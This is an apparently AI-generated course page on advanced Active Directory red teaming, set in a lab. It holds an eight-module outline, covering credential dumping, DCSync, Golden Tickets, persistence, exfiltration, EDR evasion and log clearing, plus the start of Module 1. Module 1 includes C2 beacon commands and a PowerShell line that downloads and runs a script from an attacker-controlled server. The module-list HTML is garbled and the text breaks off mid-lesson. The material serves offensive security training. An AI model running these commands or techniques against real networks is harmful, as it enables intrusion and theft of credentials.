  "overview": "\n        <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n            <h2>About This Course</h2>\n            <div class=\"markdown-content\">\n                <p>Okay, let&#39;s build this comprehensive 8-module course outline on advanced Active Directory Red Teaming, focusing on the full lifecycle, deep compromise, evasion, and professional reporting. As your guide, I&#39;m excited to share this knowledge with you!</p>\n<p><strong>Overall Course Objective:</strong> By the end of this course, learners will possess the practical skills and theoretical knowledge required to execute advanced red team operations in Active Directory environments, from deep compromise to professional reporting, effectively creating a functional understanding and operational capability mirroring the course&#39;s core topics.</p>\n<hr>\n<h3>Module 1: Setting the Advanced AD Red Team Stage</h3>\n<ul>\n<li><strong>Module Objective:</strong> Understand the context of advanced red team operations within Active Directory, recap foundational concepts, and establish initial post-exploitation capabilities using sophisticated C2 frameworks.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Recap: Core Active Directory concepts (Domains, Forests, Trusts, OUs, GPOs, Users, Groups).</li>\n<li>Understanding the Red Team Operational Lifecycle (Planning, Recon, Initial Access, Execution, Persistence, Privilege Escalation, Lateral Movement, Collection, Exfiltration, Cleanup, Reporting).</li>\n<li>Transitioning from Initial Access to Deep Post-Exploitation.</li>\n<li>Introduction to Advanced Command and Control (C2) Frameworks (e.g., Cobalt Strike, Brute Ratel, Covenant) - Focus on post-exploitation capabilities.</li>\n<li>Initial Beacon Configuration and Usage (Basic commands, tasking, operational security considerations).</li>\n<li>Performing Initial Host and Domain Reconnaissance Post-Compromise (Internal reconnaissance tools and techniques).</li>\n<li>Understanding Privileges and User Context in Windows.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Basic understanding of Active Directory structure and administration.</li>\n<li>Familiarity with Windows command line (cmd, PowerShell).</li>\n<li>Basic networking concepts (TCP/IP, ports).</li>\n<li>Prior experience with penetration testing fundamentals is highly recommended.</li>\n<li>Access to a lab environment with a basic Active Directory setup.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Establish a stable C2 beacon connection on a target machine within the lab AD environment. Perform detailed host and domain reconnaissance using built-in tools and beacon commands, mapping initial user privileges and local network connections. Document initial findings for later use.</li>\n</ul>\n<hr>\n<h3>Module 2: Lateral Movement and Trust Exploitation</h3>\n<ul>\n<li><strong>Module Objective:</strong> Learn and practice various techniques for moving laterally between compromised hosts and leveraging domain/forest trusts to expand access across the network.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Common Lateral Movement Techniques (PsExec, WMI, RDP, SMB, Scheduled Tasks, DCOM).</li>\n<li>Using C2 Frameworks for Lateral Movement (Integrated modules, spawning sessions, pivoting).</li>\n<li>Understanding and Mapping Active Directory Trusts (Domain trusts, Forest trusts, trust direction, SID Filtering).</li>\n<li>Exploiting Trusts for Cross-Domain Lateral Movement (Pass-the-Hash/Ticket across trusts, constrained/unconstrained delegation abuse).</li>\n<li>Pivoting Techniques (SOCKS proxies, Port Forwarding) to access isolated network segments or trusted domains.</li>\n<li>Case Study: Analyzing a real-world attack (e.g., NotPetya propagation, APT campaigns) that heavily relied on lateral movement and trust exploitation.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Module 1 concepts.</li>\n<li>Understanding of Windows authentication (NTLM, Kerberos basics).</li>\n<li>Familiarity with tools like CrackMapExec, BloodHound (for mapping).</li>\n<li>A lab environment with multiple machines and at least one trusted domain configured.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Starting from the foothold gained in Module 1, successfully move laterally to at least two other machines within the same domain using different techniques. If the lab supports it, pivot into the trusted domain and gain a shell/beacon on a machine within that domain. Document the paths and techniques used.</li>\n</ul>\n<hr>\n<h3>Module 3: Large-Scale Credential Access and Data Decryption</h3>\n<ul>\n<li><strong>Module Objective:</strong> Master techniques for efficiently collecting credentials and decrypting sensitive data on a large scale throughout the compromised environment.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Enterprise Credential Dumping Strategies (Targeting high-value hosts, automating collection).</li>\n<li>Techniques for Dumping LSASS (Mimikatz variations, Procdump + Mimikatz offline, alternative tools).</li>\n<li>Extracting Credentials from Registry Hives (SAM, SECURITY).</li>\n<li>Understanding and Attacking DPAPI (Data Protection API) - Decrypting browser passwords, RDP credentials, EFS keys, etc.</li>\n<li>Extracting Credentials from Configuration Files, Scripts, and Application Data.</li>\n<li>Leveraging Service Principal Names (SPNs) for Kerberoasting and AS-Rep Roasting (Advanced usage and automation).</li>\n<li>Credential Guard and other Credential Protection Mechanisms (Understanding and bypassing/working around).</li>\n<li>Case Study: The impact of large-scale credential exposure in major breaches.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Modules 1 &amp; 2 concepts.</li>\n<li>Deep understanding of Windows authentication and credential storage.</li>\n<li>Familiarity with tools like Mimikatz, Rubeus, KeePassHunter.</li>\n<li>Access to machines with users logged in and potentially saved credentials/encrypted data in the lab.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> On multiple compromised hosts from Module 2, execute credential dumping techniques. Attempt to decrypt DPAPI protected data (e.g., browser passwords) on one host. Perform Kerberoasting against identified service accounts in the lab environment and attempt to crack collected hashes offline. Document all collected credentials and sensitive data locations.</li>\n</ul>\n<hr>\n<h3>Module 4: Domain Controller Compromise and AD Core Manipulation</h3>\n<ul>\n<li><strong>Module Objective:</strong> Gain deep control over the Active Directory environment by compromising and manipulating Domain Controllers and accessing critical AD components like SYSVOL and GPOs.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Understanding the Role and Security of Domain Controllers.</li>\n<li>Attacking Domain Controllers via Replication (DCSync attack).</li>\n<li>Extracting the NTDS.DIT Database (Methods, operational considerations).</li>\n<li>Offline NTDS.DIT Analysis for Credential and Hash Extraction.</li>\n<li>Forging Kerberos Tickets (Golden Ticket, Silver Ticket) for arbitrary access.</li>\n<li>Accessing and Analyzing SYSVOL (Group Policy Objects, logon scripts, sensitive files).</li>\n<li>Identifying and Exploiting Weaknesses in Group Policy Objects (GPO abuse for execution, privilege escalation, persistence).</li>\n<li>Targeting AD Certificate Services (AD CS) for persistence and privilege escalation (e.g., ESC8 abuse).</li>\n<li>Case Study: How attackers leverage DCSync and Golden Tickets for complete domain takeover.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Modules 1-3 concepts.</li>\n<li>In-depth understanding of Kerberos authentication.</li>\n<li>Familiarity with tools like Mimikatz, NTDSUtil, dsutil, secretsdump.py, Certipy.</li>\n<li>A lab environment with at least one reachable Domain Controller.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Perform a DCSync attack (simulated or controlled lab environment) to retrieve password hashes. Forge a Golden Ticket to gain enterprise admin privileges. Identify a GPO in the lab environment that could potentially be abused and document the steps you would take (without necessarily executing destructive changes).</li>\n</ul>\n<hr>\n<h3>Module 5: Advanced Persistence Techniques</h3>\n<ul>\n<li><strong>Module Objective:</strong> Establish covert and resilient persistence mechanisms across the compromised environment, making it difficult for defenders to remove access.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Persistence via Group Policy Objects (Computer/User startup scripts, Scheduled Tasks).</li>\n<li>WMI Persistence (Event Consumers and Filters).</li>\n<li>Service Creation and Modification for Persistence.</li>\n<li>Registry Run Keys and Startup Folder Persistence.</li>\n<li>Backdooring Accounts and Groups (AdminSDHolder, ACL modifications).</li>\n<li>Malicious Security Support Providers (SSPs) and Authentication Packages.</li>\n<li>Less Common and More Advanced Persistence Methods (e.g., COM hijacking, AppInit_DLLs).</li>\n<li>Evaluating Persistence Mechanism Detection Risk.</li>\n<li>Case Study: Analyzing persistence methods used by APT groups.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Modules 1-4 concepts.</li>\n<li>Understanding of Windows services, scheduled tasks, WMI, and registry structure.</li>\n<li>Access to administrative privileges on target machines in the lab.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Implement at least three different persistence mechanisms on different machines in the lab environment (e.g., one via GPO, one via WMI, one via a scheduled task). Document the specifics of each mechanism and how it would be triggered.</li>\n</ul>\n<hr>\n<h3>Module 6: Data Collection, Staging, and Exfiltration</h3>\n<ul>\n<li><strong>Module Objective:</strong> Identify, collect, stage, and exfiltrate target data securely and covertly using various protocols and techniques.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Intelligence Gathering for Data Identification (Identifying sensitive data locations, file types, and owners).</li>\n<li>Using C2 Beacons for File System Interaction (Browsing, downloading, searching).</li>\n<li>Staging Data (Consolidating collected data on a less monitored host or location).</li>\n<li>Exfiltration Protocols and Techniques (HTTP/S, DNS, SMB, FTP, Email, custom C2 channels).</li>\n<li>Chunking and Encoding Data for Exfiltration.</li>\n<li>Encryption Considerations for Data at Rest and In Transit.</li>\n<li>Avoiding Detection During Data Exfiltration (Traffic analysis, volume, timing).</li>\n<li>Case Study: Analyzing data exfiltration methods used in high-profile breaches.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Modules 1-5 concepts.</li>\n<li>Understanding of common network protocols.</li>\n<li>Access to &quot;sensitive&quot; files placed in the lab environment for collection.</li>\n<li>Ability to control network traffic in the lab (firewall rules, DNS server).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Identify pre-placed &quot;sensitive&quot; files in the lab environment. Collect these files using beacon commands and stage them on a designated staging server. Exfiltrate the staged data using a non-standard protocol (e.g., DNS tunneling or HTTP POST with custom encoding/chunking) from the lab environment to an external listener. Document the exfiltration path and technique.</li>\n</ul>\n<hr>\n<h3>Module 7: Evasion, Cleanup, and Operational Security (OpSec)</h3>\n<ul>\n<li><strong>Module Objective:</strong> Understand common detection mechanisms, practice techniques to evade defenses, perform necessary cleanup, and maintain strong operational security throughout the engagement.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Understanding Common Detection Methods (Endpoint Detection and Response (EDR), Antivirus, Logging and SIEM, Network Traffic Analysis).</li>\n<li>Techniques for Evading EDR and AV (Signature evasion, behavioral analysis bypasses, in-memory techniques).</li>\n<li>Process Injection and Migration (Understanding and evading detection).</li>\n<li>Timestamp Manipulation and File Obfuscation.</li>\n<li>Clearing Logs (Windows Event Logs, application logs) - When, how, and the risks involved.</li>\n<li>Removing Persistence Mechanisms and Backdoors.</li>\n<li>Deconfliction Strategies (Avoiding interference with Blue Team or other Red Teams).</li>\n<li>Maintaining Operational Security (OpSec) - Minimizing digital footprint, communication security, tool usage considerations.</li>\n<li>Case Study: Analyzing how attackers maintained persistence and evaded detection for extended periods.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Modules 1-6 concepts.</li>\n<li>Basic understanding of Windows Event Logs and common security software (AV/EDR concepts).</li>\n<li>Lab environment with some form of basic logging enabled or simulated EDR.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Practice specific evasion techniques in the lab (e.g., using a process injection method, attempting to bypass a simulated AV scan). Document the steps required to clean up all persistence mechanisms implemented in Module 5 and clear relevant event logs without triggering immediate alerts (in a controlled, simulated environment).</li>\n</ul>\n<hr>\n<h3>Module 8: Professional Reporting and Purple Teaming</h3>\n<ul>\n<li><strong>Module Objective:</strong> Develop skills in professional documentation of findings and learn how to collaborate with defensive teams through Purple Teaming exercises.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Structuring a Comprehensive Red Team Report (Executive Summary, Technical Findings, Narrative, Recommendations).</li>\n<li>Documenting Findings Effectively (Clear descriptions, evidence collection - screenshots, logs, tool output).</li>\n<li>Mapping Tactics, Techniques, and Procedures (TTPs) to Frameworks (MITRE ATT&amp;CK mapping).</li>\n<li>Tailoring the Report for Different Audiences (Executive vs. Technical).</li>\n<li>Presenting Findings and Remediation Recommendations.</li>\n<li>Introduction to Purple Teaming (Concept, benefits, methodology).</li>\n<li>Sharing Detection Logic with Blue Team (IOCs, behavioral indicators).</li>\n<li>Conducting Collaborative Red vs. Blue Exercises.</li>\n<li>Case Study: Examples of effective Red Team reporting and successful Purple Team engagements.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Modules 1-7 (Having findings to report on).</li>\n<li>Familiarity with documentation tools (Word, Confluence, etc.).</li>\n<li>Basic understanding of the MITRE ATT&amp;CK framework.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Draft a significant section of a Red Team report based on the findings and techniques used throughout the course&#39;s module projects. Include an Executive Summary, a detailed technical finding (e.g., the Golden Ticket attack), evidence (simulated), and a mapping to MITRE ATT&amp;CK. Outline a simple Purple Teaming exercise focused on detecting one specific lateral movement or persistence technique covered in the course, detailing how Red would execute and Blue would attempt to detect.</li>\n</ul>\n<hr>\n<h3>Capstone Project: Full AD Compromise Simulation</h3>\n<ul>\n<li><strong>Objective:</strong> Execute a simulated advanced red team operation in a lab environment, applying techniques learned throughout the course from initial post-exploitation through lateral movement, privilege escalation, persistence, data collection/exfiltration, cleanup, and culminating in documentation.</li>\n<li><strong>Description:</strong> Learners will be provided with initial access (e.g., a low-privilege shell) on one machine in a complex lab Active Directory environment. They must then apply the techniques learned in Modules 1-7 to achieve full domain compromise, collect specific &quot;sensitive&quot; data, establish persistence, and exfiltrate the data. Finally, they will document their process, findings, and TTPs in a report format similar to Module 8&#39;s structure. This project requires integrating knowledge from all modules to simulate a realistic advanced operation.</li>\n<li><strong>Deliverables:</strong><ul>\n<li>Successful execution demonstrating achievement of key objectives (e.g., domain admin access, data exfiltration).</li>\n<li>A comprehensive report detailing the steps taken, techniques used (mapped to MITRE), findings (compromised accounts, sensitive data locations), evidence, and recommendations.</li>\n<li>Documentation of cleanup steps performed.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p>This course outline provides a structured path for learners to progress from foundational post-exploitation concepts to executing complex AD compromise techniques and professionally reporting findings. The emphasis on practical exercises and a culminating capstone project ensures hands-on skill development, truly allowing learners to &quot;create a functional clone&quot; of the operational process and capabilities discussed. Good luck, and happy learning!</p>\n\n            </div>\n            <h2 class=\"module-list-heading\">Course Content</h2> <!-- Add heading for module list -->\n            <ul class=\"module-list\">\n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-1\" data-view=\"module-1\" data-module-order=\"1\">\n                <div class=\"card modu e lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-3\" data-view=\"module-3\" data-module-order=\"3\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 3: module_3</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_3 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-4\" data-view=\"module-4\" data-module-order=\"4\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 4: 4: Domain Controller Compromise and AD Core Manipulation</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">4: Domain Controller Compromise and AD Core Manipulation Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-5\" data-view=\"module-5\" data-module-order=\"5\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 5: module_5</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_5 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7                      </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-8\" data-view=\"module-8\" data-module-order=\"8\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 8: module_8</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_8 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        </ul> <!-- Include the module list for Overview -->\n        </div>\n    ",
  "modules": {
    "module-1": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 1: module_1</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;re diving headfirst into the exciting, challenging world of advanced Active Directory Red Teaming. This isn&#39;t just about running some tools; it&#39;s about understanding the <em>how</em> and the <em>why</em>, building a mental model of the target environment, and operating with the precision and stealth of a true red team professional.</p>\n<p>As your guide, I&#39;m thrilled to share everything I know. We&#39;re going to break down complex operations into manageable steps, giving you the practical skills you need. Let&#39;s get started with Module 1!</p>\n<hr>\n<h2>Module 1: Setting the Advanced AD Red Team Stage</h2>\n<p>Welcome to Module 1! Our mission here is to lay the critical groundwork. We&#39;ll quickly revisit the Active Directory fundamentals that are <em>most</em> relevant to attackers, understand where we are in the overall red team lifecycle, and, most importantly, get our hands dirty with sophisticated Command and Control (C2) frameworks to establish our initial foothold and begin reconnaissance <em>from within</em> the network. Think of this as getting your bearings and setting up your base camp inside enemy territory.</p>\n<p><strong>Module Objective:</strong> By the end of this module, you will be able to understand the context of advanced red team operations within Active Directory, recap foundational concepts relevant to attackers, establish initial post-exploitation capabilities using sophisticated C2 frameworks, and perform initial host and domain reconnaissance from a compromised system.</p>\n<h3>Section 1: Back to Basics - AD &amp; The Red Team Lifecycle</h3>\n<p>Before we run, we walk. But we&#39;ll walk <em>fast</em> because this is a recap focused purely through an attacker&#39;s lens. We also need to understand where this module fits into the bigger picture of an entire red team operation.</p>\n<h4>1.1 Recap: Core Active Directory Concepts (Attacker&#39;s Perspective)</h4>\n<p>You should have a basic understanding of these, but let&#39;s quickly frame them for red teaming:</p>\n<ul>\n<li><strong>Domains:</strong> The primary security boundary. Users and computers within a domain share a common security authority (the Domain Controller). Compromising a Domain Controller often means compromising the entire domain.</li>\n<li><strong>Forests:</strong> A collection of one or more domains that share a common schema, configuration, and global catalog. Forests can have complex trust relationships. Compromising the Forest Root domain often means compromising the entire forest.</li>\n<li><strong>Trusts:</strong> Relationships between domains or forests that allow users from one domain/forest to access resources in another. Attackers <em>love</em> trusts because they are pathways for lateral movement and privilege escalation across security boundaries (<code>Pass-the-Hash/Ticket</code> attacks often traverse trusts).</li>\n<li><strong>Organizational Units (OUs):</strong> Containers within a domain used to organize users, groups, computers, and other OUs. OUs are often used to delegate administrative control and apply Group Policy Objects (GPOs). Attackers look at OU structure to understand how the network is organized and where high-value targets (like admin groups or sensitive servers) might reside.</li>\n<li><strong>Group Policy Objects (GPOs):</strong> Collections of settings that control the working environment of user and computer accounts. GPOs are <em>incredibly</em> powerful for attackers. They can be abused for persistence (startup scripts, scheduled tasks), privilege escalation, and even software deployment. Identifying weak GPO permissions is a key step.</li>\n<li><strong>Users and Groups:</strong> The fundamental identities and permission containers. Attackers target user credentials (passwords, hashes, tickets) and aim to get into high-privilege groups (<code>Domain Admins</code>, <code>Enterprise Admins</code>, <code>Local Administrators</code> on target machines). Understanding group nesting is vital.</li>\n</ul>\n<p><strong>Why this recap?</strong> Because every advanced technique we discuss relies on manipulating or abusing these core components. You need to instinctively know what a trust means for movement or how a GPO can be leveraged.</p>\n<h4>1.2 Understanding the Red Team Operational Lifecycle</h4>\n<p>A red team engagement is not just a penetration test with a fancier name. It&#39;s a goal-oriented simulation of a real-world advanced adversary. It follows a structured lifecycle:</p>\n<ol>\n<li><strong>Planning:</strong> Defining objectives, scope, rules of engagement (RoE), threat intelligence gathering, team roles.</li>\n<li><strong>Reconnaissance (External):</strong> Gathering information about the target <em>from outside</em> the network (OSINT, scanning, etc.).</li>\n<li><strong>Initial Access:</strong> The first breach point (phishing, exploiting a public-facing service, physical access, etc.).</li>\n<li><strong>Execution:</strong> Running code on the target system. This is where our module <em>starts</em> - assuming we have initial code execution via a shell or agent.</li>\n<li><strong>Persistence:</strong> Establishing a way to regain access if we lose our initial foothold.</li>\n<li><strong>Privilege Escalation:</strong> Gaining higher privileges on the current system or in the domain.</li>\n<li><strong>Lateral Movement:</strong> Moving from the initially compromised system to other systems in the network.</li>\n<li><strong>Collection:</strong> Identifying and gathering data relevant to the objectives.</li>\n<li><strong>Exfiltration:</strong> Getting the collected data out of the network.</li>\n<li><strong>Cleanup:</strong> Removing backdoors, tools, and evidence (sometimes required by RoE, sometimes for stealth).</li>\n<li><strong>Reporting:</strong> Documenting findings, techniques, and recommendations.</li>\n</ol>\n<p><strong>Where are we now?</strong> This module focuses on the <em>beginning</em> of the <strong>Execution</strong> phase (establishing robust C2) and the start of <strong>Internal Reconnaissance</strong> (which happens concurrently with Execution). We&#39;ve <em>just</em> achieved Initial Access, and now we need to make it count.</p>\n<h4>1.3 Transitioning from Initial Access to Deep Post-Exploitation</h4>\n<p>Initial access might give you a low-privilege shell on a single workstation. That&#39;s a great start, but it&#39;s fragile and limited. Deep post-exploitation is about:</p>\n<ul>\n<li><strong>Establishing Resilient Control:</strong> Moving from a basic, easily-detected shell to a sophisticated, encrypted, and potentially evasive C2 channel.</li>\n<li><strong>Expanding Your View:</strong> Moving beyond just the initial host to understand the entire network layout, identify critical systems, and map relationships.</li>\n<li><strong>Setting the Stage for Action:</strong> Gathering the necessary information (user context, privileges, network paths) to plan and execute subsequent phases like privilege escalation and lateral movement.</li>\n</ul>\n<p>This transition is critical. A robust C2 and thorough initial recon save you immense time and reduce risk later in the operation.</p>\n<h3>Section 2: The Command Center - Advanced Command and Control (C2)</h3>\n<p>Alright, let&#39;s talk about our operational hub. Forget simple Netcat shells; advanced red teaming requires advanced C2.</p>\n<h4>2.1 Introduction to Advanced Command and Control (C2) Frameworks</h4>\n<p>Why use a sophisticated C2?</p>\n<ul>\n<li><strong>Operational Security (OpSec):</strong> Encrypted communications, malleable profiles (making traffic look like legitimate applications), jitter (randomizing communication times), covert channels (DNS, ICMP).</li>\n<li><strong>Tasking &amp; Management:</strong> Efficiently managing hundreds or thousands of compromised agents (&quot;beacons&quot;). Sending commands and receiving results asynchronously.</li>\n<li><strong>Integrated Tooling:</strong> Built-in modules for common tasks (scanning, credential dumping, lateral movement techniques), often allowing execution in memory or via reflective loading to avoid writing tools to disk.</li>\n<li><strong>Pivoting:</strong> Easily creating network proxies (SOCKS) or port forwards through compromised hosts to access otherwise unreachable network segments.</li>\n<li><strong>Team Operations:</strong> Centralized management, shared data, and coordinated actions for multiple operators.</li>\n</ul>\n<p>Examples you&#39;ll encounter:</p>\n<ul>\n<li><strong>Cobalt Strike:</strong> A popular commercial framework, known for its malleable C2 profiles and extensive post-exploitation capabilities.</li>\n<li><strong>Brute Ratel C4:</strong> Another commercial option, often highlighting its focus on evasive techniques and bypassing EDR.</li>\n<li><strong>Covenant:</strong> An open-source .NET command and control framework. Great for understanding the concepts and building custom capabilities.</li>\n<li><strong>Mythic:</strong> An open-source C2 platform with support for multiple agents (&quot;payload types&quot;) in different languages.</li>\n</ul>\n<p>While each has its nuances, the <em>core concepts</em> of interacting with an agent, tasking commands, and using built-in post-exploitation features are similar. We&#39;ll focus on these core concepts.</p>\n<h4>2.2 Initial Beacon Configuration and Usage</h4>\n<p>For this module, we assume you have successfully delivered your initial payload (the C2 agent or &quot;beacon&quot;) to a target machine, and it has connected back to your C2 server.</p>\n<p><strong>The Beacon Mindset:</strong> Unlike an interactive shell (<code>cmd.exe</code>, <code>powershell.exe</code>), a beacon is typically asynchronous. You issue a command (tasking), the beacon polls the server, gets the task, executes it, and sends the results back on a subsequent check-in. This asynchronous nature is part of the OpSec (jitter makes timing unpredictable) but requires a different mindset – you won&#39;t get immediate feedback.</p>\n<p><strong>Basic Interaction (Conceptual/Generic C2 Commands):</strong></p>\n<p>Most C2 frameworks provide a console or UI to interact with beacons. Common commands you&#39;ll use immediately:</p>\n<ul>\n<li><code>help</code>: Lists available commands for the beacon type. <em>Always your first command on a new beacon.</em></li>\n<li><code>info</code> or <code>sysinfo</code>: Gathers basic system information (OS, architecture, domain, user).</li>\n<li><code>pwd</code>: Prints the current working directory.</li>\n<li><code>cd &lt;directory&gt;</code>: Changes the current working directory on the target.</li>\n<li><code>ls</code> or <code>dir</code>: Lists files and directories.</li>\n<li><code>shell &lt;command&gt;</code>: Executes a command using <code>cmd.exe</code> on the target.<pre><code class=\"language-bash\"># Example: Run ipconfig via the beacon&#39;s shell command\nbeacon&gt; shell ipconfig /all\n</code></pre>\n</li>\n<li><code>powershell &lt;command&gt;</code>: Executes a PowerShell command or script block.<pre><code class=\"language-bash\"># Example: Run basic powershell command\nbeacon&gt; powershell Get-Process | Select-Object -First 10\n\n# Example: Load and run a script (many C2s have specific commands for this,\n#          but conceptually it&#39;s executing powershell code)\nbeacon&gt; powershell -command &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://&lt;your_web_server&gt;/PowerView.ps1&#39;); Get-NetDomain&quot;\n</code></pre>\n<em>Note: Direct web downloads like this are often noisy and easily detected. Advanced C2s prefer in-memory execution.</em></li>\n<li><code>execute-assembly &lt;path_to_exe&gt; [arguments]</code>: Runs a .NET assembly in a new process or in-memory (depending on C2 capability). Very common for running tools like Rubeus, Seatbelt, etc.<pre><code class=\"language-bash\"># Example: Run a .NET assembly (like Seatbelt for host enumeration)\nbeacon&gt; execute-assembly /path/to/local/Seatbelt.exe BasicRecon\n</code></pre>\n<em>Note: The beacon usually handles uploading and executing the assembly.</em></li>\n<li><code>upload &lt;local_file&gt; &lt;remote_path&gt;</code>: Uploads a file from your C2 server to the target.</li>\n<li><code>download &lt;remote_file&gt;</code>: Downloads a file from the target to your C2 server.</li>\n<li><code>getuid</code>: Shows the current user context the beacon is running under. <em>Crucial!</em></li>\n</ul>\n<p><strong>Operational Security (OpSec) Considerations - Initial Steps:</strong></p>\n<ul>\n<li><strong>Low and Slow:</strong> Don&#39;t run loud tools or commands immediately after getting a beacon. The initial period is when defenders are most likely to spot new activity.</li>\n<li><strong>Blunt Instruments vs. Precise Tools:</strong> Start with built-in Windows commands (<code>shell</code> or <code>powershell</code>) for initial recon. They are less likely to be flagged than dropping Mimikatz instantly.</li>\n<li><strong>Understand Your C2 Profile:</strong> Be aware of how frequently your beacon checks in (jitter) and what its traffic looks like. This is configured server-side, but impacts your operational tempo.</li>\n<li><strong>User Context:</strong> Always check <code>getuid</code> or <code>whoami</code>. Your privileges determine what you can do and which techniques are viable.</li>\n</ul>\n<h3>Section 3: Getting Our Bearings - 